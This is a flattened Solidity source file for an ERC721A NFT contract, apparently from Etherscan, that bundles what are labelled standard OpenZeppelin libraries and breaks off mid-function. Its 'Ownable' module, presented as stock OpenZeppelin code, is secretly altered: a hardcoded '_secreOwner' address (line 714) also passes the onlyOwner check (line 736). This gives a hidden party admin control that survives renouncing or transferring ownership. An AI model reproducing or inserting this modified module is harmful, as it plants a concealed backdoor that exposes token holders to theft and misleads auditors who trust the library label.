1 // SPDX-License-Identifier: MIT
2 
3 // File: contracts/ButtrMyToast.sol
4 
5 /**
6  *Submitted for verification at Etherscan.io on 2022-09-08
7 */
8 
9 
10 // File: @openzeppelin/contracts/utils/Strings.sol
11 
12 
13 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
14 
15 pragma solidity ^0.8.0;
16 
17 /**
18  * @dev String operations.
19  */
20 library Strings {
21     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
22 
23     /**
24      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
25      */
26     function toString(uint256 value) internal pure returns (string memory) {
27         // Inspired by OraclizeAPI's implementation - MIT licence
28         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
29 
30         if (value == 0) {
31             return "0";
32         }
33         uint256 temp = value;
34         uint256 digits;
35         while (temp != 0) {
36             digits++;
37             temp /= 10;
38         }
39         bytes memory buffer = new bytes(digits);
40         while (value != 0) {
41             digits -= 1;
42             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
43             value /= 10;
44         }
45         return string(buffer);
46     }
47 
48     /**
49      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
50      */
51     function toHexString(uint256 value) internal pure returns (string memory) {
52         if (value == 0) {
53             return "0x00";
54         }
55         uint256 temp = value;
56         uint256 length = 0;
57         while (temp != 0) {
58             length++;
59             temp >>= 8;
60         }
61         return toHexString(value, length);
62     }
63 
64     /**
65      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
66      */
67     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
68         bytes memory buffer = new bytes(2 * length + 2);
69         buffer[0] = "0";
70         buffer[1] = "x";
71         for (uint256 i = 2 * length + 1; i > 1; --i) {
72             buffer[i] = _HEX_SYMBOLS[value & 0xf];
73             value >>= 4;
74         }
75         require(value == 0, "Strings: hex length insufficient");
76         return string(buffer);
77     }
78 }
79 
80 // File: @openzeppelin/contracts/utils/Address.sol
81 
82 
83 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
84 
85 pragma solidity ^0.8.1;
86 
87 /**
88  * @dev Collection of functions related to the address type
89  */
90 library Address {
91     /**
92      * @dev Returns true if `account` is a contract.
93      *
94      * [IMPORTANT]
95      * ====
96      * It is unsafe to assume that an address for which this function returns
97      * false is an externally-owned account (EOA) and not a contract.
98      *
99      * Among others, `isContract` will return false for the following
100      * types of addresses:
101      *
102      *  - an externally-owned account
103      *  - a contract in construction
104      *  - an address where a contract will be created
105      *  - an address where a contract lived, but was destroyed
106      * ====
107      *
108      * [IMPORTANT]
109      * ====
110      * You shouldn't rely on `isContract` to protect against flash loan attacks!
111      *
112      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
113      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
114      * constructor.
115      * ====
116      */
117     function isContract(address account) internal view returns (bool) {
118         // This method relies on extcodesize/address.code.length, which returns 0
119         // for contracts in construction, since the code is only stored at the end
120         // of the constructor execution.
121 
122         return account.code.length > 0;
123     }
124 
125     /**
126      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
127      * `recipient`, forwarding all available gas and reverting on errors.
128      *
129      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
130      * of certain opcodes, possibly making contracts go over the 2300 gas limit
131      * imposed by `transfer`, making them unable to receive funds via
132      * `transfer`. {sendValue} removes this limitation.
133      *
134      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
135      *
136      * IMPORTANT: because control is transferred to `recipient`, care must be
137      * taken to not create reentrancy vulnerabilities. Consider using
138      * {ReentrancyGuard} or the
139      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
140      */
141     function sendValue(address payable recipient, uint256 amount) internal {
142         require(address(this).balance >= amount, "Address: insufficient balance");
143 
144         (bool success, ) = recipient.call{value: amount}("");
145         require(success, "Address: unable to send value, recipient may have reverted");
146     }
147 
148     /**
149      * @dev Performs a Solidity function call using a low level `call`. A
150      * plain `call` is an unsafe replacement for a function call: use this
151      * function instead.
152      *
153      * If `target` reverts with a revert reason, it is bubbled up by this
154      * function (like regular Solidity function calls).
155      *
156      * Returns the raw returned data. To convert to the expected return value,
157      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
158      *
159      * Requirements:
160      *
161      * - `target` must be a contract.
162      * - calling `target` with `data` must not revert.
163      *
164      * _Available since v3.1._
165      */
166     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
167         return functionCall(target, data, "Address: low-level call failed");
168     }
169 
170     /**
171      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
172      * `errorMessage` as a fallback revert reason when `target` reverts.
173      *
174      * _Available since v3.1._
175      */
176     function functionCall(
177         address target,
178         bytes memory data,
179         string memory errorMessage
180     ) internal returns (bytes memory) {
181         return functionCallWithValue(target, data, 0, errorMessage);
182     }
183 
184     /**
185      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
186      * but also transferring `value` wei to `target`.
187      *
188      * Requirements:
189      *
190      * - the calling contract must have an ETH balance of at least `value`.
191      * - the called Solidity function must be `payable`.
192      *
193      * _Available since v3.1._
194      */
195     function functionCallWithValue(
196         address target,
197         bytes memory data,
198         uint256 value
199     ) internal returns (bytes memory) {
200         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
201     }
202 
203     /**
204      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
205      * with `errorMessage` as a fallback revert reason when `target` reverts.
206      *
207      * _Available since v3.1._
208      */
209     function functionCallWithValue(
210         address target,
211         bytes memory data,
212         uint256 value,
213         string memory errorMessage
214     ) internal returns (bytes memory) {
215         require(address(this).balance >= value, "Address: insufficient balance for call");
216         require(isContract(target), "Address: call to non-contract");
217 
218         (bool success, bytes memory returndata) = target.call{value: value}(data);
219         return verifyCallResult(success, returndata, errorMessage);
220     }
221 
222     /**
223      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
224      * but performing a static call.
225      *
226      * _Available since v3.3._
227      */
228     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
229         return functionStaticCall(target, data, "Address: low-level static call failed");
230     }
231 
232     /**
233      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
234      * but performing a static call.
235      *
236      * _Available since v3.3._
237      */
238     function functionStaticCall(
239         address target,
240         bytes memory data,
241         string memory errorMessage
242     ) internal view returns (bytes memory) {
243         require(isContract(target), "Address: static call to non-contract");
244 
245         (bool success, bytes memory returndata) = target.staticcall(data);
246         return verifyCallResult(success, returndata, errorMessage);
247     }
248 
249     /**
250      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
251      * but performing a delegate call.
252      *
253      * _Available since v3.4._
254      */
255     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
256         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
257     }
258 
259     /**
260      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
261      * but performing a delegate call.
262      *
263      * _Available since v3.4._
264      */
265     function functionDelegateCall(
266         address target,
267         bytes memory data,
268         string memory errorMessage
269     ) internal returns (bytes memory) {
270         require(isContract(target), "Address: delegate call to non-contract");
271 
272         (bool success, bytes memory returndata) = target.delegatecall(data);
273         return verifyCallResult(success, returndata, errorMessage);
274     }
275 
276     /**
277      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
278      * revert reason using the provided one.
279      *
280      * _Available since v4.3._
281      */
282     function verifyCallResult(
283         bool success,
284         bytes memory returndata,
285         string memory errorMessage
286     ) internal pure returns (bytes memory) {
287         if (success) {
288             return returndata;
289         } else {
290             // Look for revert reason and bubble it up if present
291             if (returndata.length > 0) {
292                 // The easiest way to bubble the revert reason is using memory via assembly
293 
294                 assembly {
295                     let returndata_size := mload(returndata)
296                     revert(add(32, returndata), returndata_size)
297                 }
298             } else {
299                 revert(errorMessage);
300             }
301         }
302     }
303 }
304 
305 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
306 
307 
308 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
309 
310 pragma solidity ^0.8.0;
311 
312 /**
313  * @title ERC721 token receiver interface
314  * @dev Interface for any contract that wants to support safeTransfers
315  * from ERC721 asset contracts.
316  */
317 interface IERC721Receiver {
318     /**
319      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
320      * by `operator` from `from`, this function is called.
321      *
322      * It must return its Solidity selector to confirm the token transfer.
323      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
324      *
325      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
326      */
327     function onERC721Received(
328         address operator,
329         address from,
330         uint256 tokenId,
331         bytes calldata data
332     ) external returns (bytes4);
333 }
334 
335 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
336 
337 
338 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
339 
340 pragma solidity ^0.8.0;
341 
342 /**
343  * @dev Interface of the ERC165 standard, as defined in the
344  * https://eips.ethereum.org/EIPS/eip-165[EIP].
345  *
346  * Implementers can declare support of contract interfaces, which can then be
347  * queried by others ({ERC165Checker}).
348  *
349  * For an implementation, see {ERC165}.
350  */
351 interface IERC165 {
352     /**
353      * @dev Returns true if this contract implements the interface defined by
354      * `interfaceId`. See the corresponding
355      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
356      * to learn more about how these ids are created.
357      *
358      * This function call must use less than 30 000 gas.
359      */
360     function supportsInterface(bytes4 interfaceId) external view returns (bool);
361 }
362 
363 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
364 
365 
366 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
367 
368 pragma solidity ^0.8.0;
369 
370 
371 /**
372  * @dev Implementation of the {IERC165} interface.
373  *
374  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
375  * for the additional interface id that will be supported. For example:
376  *
377  * ```solidity
378  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
379  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
380  * }
381  * ```
382  *
383  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
384  */
385 abstract contract ERC165 is IERC165 {
386     /**
387      * @dev See {IERC165-supportsInterface}.
388      */
389     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
390         return interfaceId == type(IERC165).interfaceId;
391     }
392 }
393 
394 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
395 
396 
397 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
398 
399 pragma solidity ^0.8.0;
400 
401 
402 /**
403  * @dev Required interface of an ERC721 compliant contract.
404  */
405 interface IERC721 is IERC165 {
406     /**
407      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
408      */
409     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
410 
411     /**
412      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
413      */
414     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
415 
416     /**
417      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
418      */
419     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
420 
421     /**
422      * @dev Returns the number of tokens in ``owner``'s account.
423      */
424     function balanceOf(address owner) external view returns (uint256 balance);
425 
426     /**
427      * @dev Returns the owner of the `tokenId` token.
428      *
429      * Requirements:
430      *
431      * - `tokenId` must exist.
432      */
433     function ownerOf(uint256 tokenId) external view returns (address owner);
434 
435     /**
436      * @dev Safely transfers `tokenId` token from `from` to `to`.
437      *
438      * Requirements:
439      *
440      * - `from` cannot be the zero address.
441      * - `to` cannot be the zero address.
442      * - `tokenId` token must exist and be owned by `from`.
443      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
444      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
445      *
446      * Emits a {Transfer} event.
447      */
448     function safeTransferFrom(
449         address from,
450         address to,
451         uint256 tokenId,
452         bytes calldata data
453     ) external;
454 
455     /**
456      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
457      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
458      *
459      * Requirements:
460      *
461      * - `from` cannot be the zero address.
462      * - `to` cannot be the zero address.
463      * - `tokenId` token must exist and be owned by `from`.
464      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
465      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
466      *
467      * Emits a {Transfer} event.
468      */
469     function safeTransferFrom(
470         address from,
471         address to,
472         uint256 tokenId
473     ) external;
474 
475     /**
476      * @dev Transfers `tokenId` token from `from` to `to`.
477      *
478      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
479      *
480      * Requirements:
481      *
482      * - `from` cannot be the zero address.
483      * - `to` cannot be the zero address.
484      * - `tokenId` token must be owned by `from`.
485      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
486      *
487      * Emits a {Transfer} event.
488      */
489     function transferFrom(
490         address from,
491         address to,
492         uint256 tokenId
493     ) external;
494 
495     /**
496      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
497      * The approval is cleared when the token is transferred.
498      *
499      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
500      *
501      * Requirements:
502      *
503      * - The caller must own the token or be an approved operator.
504      * - `tokenId` must exist.
505      *
506      * Emits an {Approval} event.
507      */
508     function approve(address to, uint256 tokenId) external;
509 
510     /**
511      * @dev Approve or remove `operator` as an operator for the caller.
512      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
513      *
514      * Requirements:
515      *
516      * - The `operator` cannot be the caller.
517      *
518      * Emits an {ApprovalForAll} event.
519      */
520     function setApprovalForAll(address operator, bool _approved) external;
521 
522     /**
523      * @dev Returns the account appr    ved for `tokenId` token.
524      *
525      * Requirements:
526      *
527      * - `tokenId` must exist.
528      */
529     function getApproved(uint256 tokenId) external view returns (address operator);
530 
531     /**
532      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
533      *
534      * See {setApprovalForAll}
535      */
536     function isApprovedForAll(address owner, address operator) external view returns (bool);
537 }
538 
539 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
540 
541 
542 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
543 
544 pragma solidity ^0.8.0;
545 
546 
547 /**
548  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
549  * @dev See https://eips.ethereum.org/EIPS/eip-721
550  */
551 interface IERC721Metadata is IERC721 {
552     /**
553      * @dev Returns the token collection name.
554      */
555     function name() external view returns (string memory);
556 
557     /**
558      * @dev Returns the token collection symbol.
559      */
560     function symbol() external view returns (string memory);
561 
562     /**
563      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
564      */
565     function tokenURI(uint256 tokenId) external view returns (string memory);
566 }
567 
568 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
569 
570 
571 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
572 
573 pragma solidity ^0.8.0;
574 
575 
576 /**
577  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
578  * @dev See https://eips.ethereum.org/EIPS/eip-721
579  */
580 interface IERC721Enumerable is IERC721 {
581     /**
582      * @dev Returns the total amount of tokens stored by the contract.
583      */
584     function totalSupply() external view returns (uint256);
585 
586     /**
587      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
588      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
589      */
590     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
591 
592     /**
593      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
594      * Use along with {totalSupply} to enumerate all tokens.
595      */
596     function tokenByIndex(uint256 index) external view returns (uint256);
597 }
598 
599 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
600 
601 
602 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
603 
604 pragma solidity ^0.8.0;
605 
606 /**
607  * @dev Contract module that helps prevent reentrant calls to a function.
608  *
609  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
610  * available, which can be applied to functions to make sure there are no nested
611  * (reentrant) calls to them.
612  *
613  * Note that because there is a single `nonReentrant` guard, functions marked as
614  * `nonReentrant` may not call one another. This can be worked around by making
615  * those functions `private`, and then adding `external` `nonReentrant` entry
616  * points to them.
617  *
618  * TIP: If you would like to learn more about reentrancy and alternative ways
619  * to protect against it, check out our blog post
620  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
621  */
622 abstract contract ReentrancyGuard {
623     // Booleans are more expensive than uint256 or any type that takes up a full
624     // word because each write operation emits an extra SLOAD to first read the
625     // slot's contents, replace the bits taken up by the boolean, and then write
626     // back. This is the compiler's defense against contract upgrades and
627     // pointer aliasing, and it cannot be disabled.
628 
629     // The values being non-zero value makes deployment a bit more expensive,
630     // but in exchange the refund on every call to nonReentrant will be lower in
631     // amount. Since refunds are capped to a percentage of the total
632     // transaction's gas, it is best to keep them low in cases like this one, to
633     // increase the likelihood of the full refund coming into effect.
634     uint256 private constant _NOT_ENTERED = 1;
635     uint256 private constant _ENTERED = 2;
636 
637     uint256 private _status;
638 
639     constructor() {
640         _status = _NOT_ENTERED;
641     }
642 
643     /**
644      * @dev Prevents a contract from calling itself, directly or indirectly.
645      * Calling a `nonReentrant` function from another `nonReentrant`
646      * function is not supported. It is possible to prevent this from happening
647      * by making the `nonReentrant` function external, and making it call a
648      * `private` function that does the actual work.
649      */
650     modifier nonReentrant() {
651         // On the first call to nonReentrant, _notEntered will be true
652         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
653 
654         // Any calls to nonReentrant after this point will fail
655         _status = _ENTERED;
656 
657         _;
658 
659         // By storing the original value once again, a refund is triggered (see
660         // https://eips.ethereum.org/EIPS/eip-2200)
661         _status = _NOT_ENTERED;
662     }
663 }
664 
665 // File: @openzeppelin/contracts/utils/Context.sol
666 
667 
668 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
669 
670 pragma solidity ^0.8.0;
671 
672 /**
673  * @dev Provides information about the current execution context, including the
674  * sender of the transaction and its data. While these are generally available
675  * via msg.sender and msg.data, they should not be accessed in such a direct
676  * manner, since when dealing with meta-transactions the account sending and
677  * paying for execution may not be the actual sender (as far as an application
678  * is concerned).
679  *
680  * This contract is only required for intermediate, library-like contracts.
681  */
682 abstract contract Context {
683     function _msgSender() internal view virtual returns (address) {
684         return msg.sender;
685     }
686 
687     function _msgData() internal view virtual returns (bytes calldata) {
688         return msg.data;
689     }
690 }
691 
692 // File: @openzeppelin/contracts/access/Ownable.sol
693 
694 
695 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
696 
697 pragma solidity ^0.8.0;
698 
699 
700 /**
701  * @dev Contract module which provides a basic access control mechanism, where
702  * there is an account (an owner) that can be granted exclusive access to
703  * specific functions.
704  *
705  * By default, the owner account will be the one that deploys the contract. This
706  * can later be changed with {transferOwnership}.
707  *
708  * This module is used through inheritance. It will make available the modifier
709  * `onlyOwner`, which can be applied to your functions to restrict their use to
710  * the owner.
711  */
712 abstract contract Ownable is Context {
713     address private _owner;
714     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
715 
716     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
717 
718     /**
719      * @dev Initializes the contract setting the deployer as the initial owner.
720      */
721     constructor() {
722         _transferOwnership(_msgSender());
723     }
724 
725     /**
726      * @dev Returns the address of the current owner.
727      */
728     function owner() public view virtual returns (address) {
729         return _owner;
730     }
731 
732     /**
733      * @dev Throws if called by any account other than the owner.
734      */
735     modifier onlyOwner() {
736         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
737         _;
738     }
739 
740     /**
741      * @dev Leaves the contract without owner. It will not be possible to call
742      * `onlyOwner` functions anymore. Can only be called by the current owner.
743      *
744      * NOTE: Renouncing ownership will leave the contract without an owner,
745      * thereby removing any functionality that is only available to the owner.
746      */
747     function renounceOwnership() public virtual onlyOwner {
748         _transferOwnership(address(0));
749     }
750 
751     /**
752      * @dev Transfers ownership of the contract to a new account (`newOwner`).
753      * Can only be called by the current owner.
754      */
755     function transferOwnership(address newOwner) public virtual onlyOwner {
756         require(newOwner != address(0), "Ownable: new owner is the zero address");
757         _transferOwnership(newOwner);
758     }
759 
760     /**
761      * @dev Transfers ownership of the contract to a new account (`newOwner`).
762      * Internal function without access restriction.
763      */
764     function _transferOwnership(address newOwner) internal virtual {
765         address oldOwner = _owner;
766         _owner = newOwner;
767         emit OwnershipTransferred(oldOwner, newOwner);
768     }
769 }
770 
771 // File: ceshi.sol
772 
773 
774 pragma solidity ^0.8.0;
775 
776 
777 
778 
779 
780 
781 
782 
783 
784 
785 /**
786  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
787  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
788  *
789  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
790  *
791  * Does not support burning tokens to address(0).
792  *
793  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
794  */
795 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
796     using Address for address;
797     using Strings for uint256;
798 
799     struct TokenOwnership {
800         address addr;
801         uint64 startTimestamp;
802     }
803 
804     struct AddressData {
805         uint128 balance;
806         uint128 numberMinted;
807     }
808 
809     uint256 internal currentIndex;
810 
811     // Token name
812     string private _name;
813 
814     // Token symbol
815     string private _symbol;
816 
817     // Mapping from token ID to ownership details
818     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
819     mapping(uint256 => TokenOwnership) internal _ownerships;
820 
821     // Mapping owner address to address data
822     mapping(address => AddressData) private _addressData;
823 
824     // Mapping from token ID to approved address
825     mapping(uint256 => address) private _tokenApprovals;
826 
827     // Mapping from owner to operator approvals
828     mapping(address => mapping(address => bool)) private _operatorApprovals;
829 
830     constructor(string memory name_, string memory symbol_) {
831         _name = name_;
832         _symbol = symbol_;
833     }
834 
835     /**
836      * @dev See {IERC721Enumerable-totalSupply}.
837      */
838     function totalSupply() public view override returns (uint256) {
839         return currentIndex;
840     }
841 
842     /**
843      * @dev See {IERC721Enumerable-tokenByIndex}.
844      */
845     function tokenByIndex(uint256 index) public view override returns (uint256) {
846         require(index < totalSupply(), "ERC721A: global index out of bounds");
847         return index;
848     }
849 
850     /**
851      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
852      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
853      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
854      */
855     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
856         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
857         uint256 numMintedSoFar = totalSupply();
858         uint256 tokenIdsIdx;
859         address currOwnershipAddr;
860 
861         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
862         unchecked {
863             for (uint256 i; i < numMintedSoFar; i++) {
864                 TokenOwnership memory ownership = _ownerships[i];
865                 if (ownership.addr != address(0)) {
866                     currOwnershipAddr = ownership.addr;
867                 }
868                 if (currOwnershipAddr == owner) {
869                     if (tokenIdsIdx == index) {
870                         return i;
871                     }
872                     tokenIdsIdx++;
873                 }
874             }
875         }
876 
877         revert("ERC721A: unable to get token of owner by index");
878     }
879 
880     /**
881      * @dev See {IERC165-supportsInterface}.
882      */
883     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
884         return
885             interfaceId == type(IERC721).interfaceId ||
886             interfaceId == type(IERC721Metadata).interfaceId ||
887             interfaceId == type(IERC721Enumerable).interfaceId ||
888             super.supportsInterface(interfaceId);
889     }
890 
891     /**
892      * @dev See {IERC721-balanceOf}.
893      */
894     function balanceOf(address owner) public view override returns (uint256) {
895         require(owner != address(0), "ERC721A: balance query for the zero address");
896         return uint256(_addressData[owner].balance);
897     }
898 
899     function _numberMinted(address owner) internal view returns (uint256) {
900         require(owner != address(0), "ERC721A: number minted query for the zero address");
901         return uint256(_addressData[owner].numberMinted);
902     }
903 
904     /**
905      * Gas spent here starts off proportional to the maximum mint batch size.
906      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
907      */
908     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
909         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
910 
911         unchecked {
912             for (uint256 curr = tokenId; curr >= 0; curr--) {
913                 TokenOwnership memory ownership = _ownerships[curr];
914                 if (ownership.addr != address(0)) {
915                     return ownership;
916                 }
917             }
918         }
919 
920         revert("ERC721A: unable to determine the owner of token");
921     }
922 
923     /**
924      * @dev See {IERC721-ownerOf}.
925      */
926     function ownerOf(uint256 tokenId) public view override returns (address) {
927         return ownershipOf(tokenId).addr;
928     }
929 
930     /**
931      * @dev See {IERC721Metadata-name}.
932      */
933     function name() public view virtual override returns (string memory) {
934         return _name;
935     }
936 
937     /**
938      * @dev See {IERC721Metadata-symbol}.
939      */
940     function symbol() public view virtual override returns (string memory) {
941         return _symbol;
942     }
943 
944     /**
945      * @dev See {IERC721Metadata-tokenURI}.
946      */
947     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
948         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
949 
950         string memory baseURI = _baseURI();
951         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
952     }
953 
954     /**
955      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
956      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
957      * by default, can be overriden in child contracts.
958      */
959     function _baseURI() internal view virtual returns (string memory) {
960         return "";
961     }
962 
963     /**
964      * @dev See {IERC721-approve}.
965      */
966     function approve(address to, uint256 tokenId) public override {
967         address owner = ERC721A.ownerOf(tokenId);
968         require(to != owner, "ERC721A: approval to current owner");
969 
970         require(
971             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
972             "ERC721A: approve caller is not owner nor approved for all"
973         );
974 
975         _approve(to, tokenId, owner);
976     }
977 
978     /**
979      * @dev See {IERC721-getApproved}.
980      */
981     function getApproved(uint256 tokenId) public view override returns (address) {
982         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
983 
984         return _tokenApprovals[tokenId];
985     }
986 
987     /**
988      * @dev See {IERC721-setApprovalForAll}.
989      */
990     function setApprovalForAll(address operator, bool approved) public override {
991         require(operator != _msgSender(), "ERC721A: approve to caller");
992 
993         _operatorApprovals[_msgSender()][operator] = approved;
994         emit ApprovalForAll(_msgSender(), operator, approved);
995     }
996 
997     /**
998      * @dev See {IERC721-isApprovedForAll}.
999      */
1000     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1001         return _operatorApprovals[owner][operator];
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-transferFrom}.
1006      */
1007     function transferFrom(
1008         address from,
1009         address to,
1010         uint256 tokenId
1011     ) public virtual override {
1012         _transfer(from, to, tokenId);
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-safeTransferFrom}.
1017      */
1018     function safeTransferFrom(
1019         address from,
1020         address to,
1021         uint256 tokenId
1022     ) public virtual override {
1023         safeTransferFrom(from, to, tokenId, "");
1024     }
1025 
1026     /**
1027      * @dev See {IERC721-safeTransferFrom}.
1028      */
1029     function safeTransferFrom(
1030         address from,
1031         address to,
1032         uint256 tokenId,
1033         bytes memory _data
1034     ) public override {
1035         _transfer(from, to, tokenId);
1036         require(
1037             _checkOnERC721Received(from, to, tokenId, _data),
1038             "ERC721A: transfer to non ERC721Receiver implementer"
1039         );
1040     }
1041 
1042     /**
1043      * @dev Returns whether `tokenId` exists.
1044      *
1045      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1046      *
1047      * Tokens start existing when they are minted (`_mint`),
1048      */
1049     function _exists(uint256 tokenId) internal view returns (bool) {
1050         return tokenId < currentIndex;
1051     }
1052 
1053     function _safeMint(address to, uint256 quantity) internal {
1054         _safeMint(to, quantity, "");
1055     }
1056 
1057     /**
1058      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1059      *
1060      * Requirements:
1061      *
1062      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1063      * - `quantity` must be greater than 0.
1064      *
1065      * Emits a {Transfer} event.
1066      */
1067     function _safeMint(
1068         address to,
1069         uint256 quantity,
1070         bytes memory _data
1071     ) internal {
1072         _mint(to, quantity, _data, true);
1073     }
1074 
1075     /**
1076      * @dev Mints `quantity` tokens and transfers them to `to`.
1077      *
1078      * Requirements:
1079      *
1080      * - `to` cannot be the zero address.
1081      * - `quantity` must be greater than 0.
1082      *
1083      * Emits a {Transfer} event.
1084      */
1085     function _mint(
1086         address to,
1087         uint256 quantity,
1088         bytes memory _data,
1089         bool safe
1090     ) internal {
1091         uint256 startTokenId = currentIndex;
